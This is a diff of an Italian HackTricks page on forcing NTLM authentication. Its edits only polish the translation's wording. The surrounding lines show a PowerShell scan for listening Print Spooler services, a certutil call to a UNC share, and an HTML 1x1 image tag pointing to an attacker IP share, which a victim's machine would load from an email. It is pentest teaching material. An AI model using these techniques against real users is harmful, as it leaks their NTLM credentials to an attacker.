@@ -32,7 +32,7 @@ Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (Operati
 ```
 ### Trovare i servizi Spooler in ascolto
 
-Utilizzando una versione leggermente modificata di @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), verifica se il servizio Spooler è in ascolto:
+Utilizzando un @mysmartlogin (Vincent Le Toux) leggermente modificato [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), verifica se il Servizio Spooler è in ascolto:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -101,7 +101,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Via email
 
-Se conosci l'**indirizzo email** dell'utente che accede a una macchina che vuoi compromettere, potresti semplicemente inviargli un **email con un'immagine 1x1** come
+Se conosci l'**indirizzo email** dell'utente che accede a una macchina che vuoi compromettere, potresti semplicemente inviargli un'**email con un'immagine 1x1** come
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -128,7 +128,7 @@ Impara e pratica il hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="
 
 * Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository github.
 
 </details>
 {% endhint %}
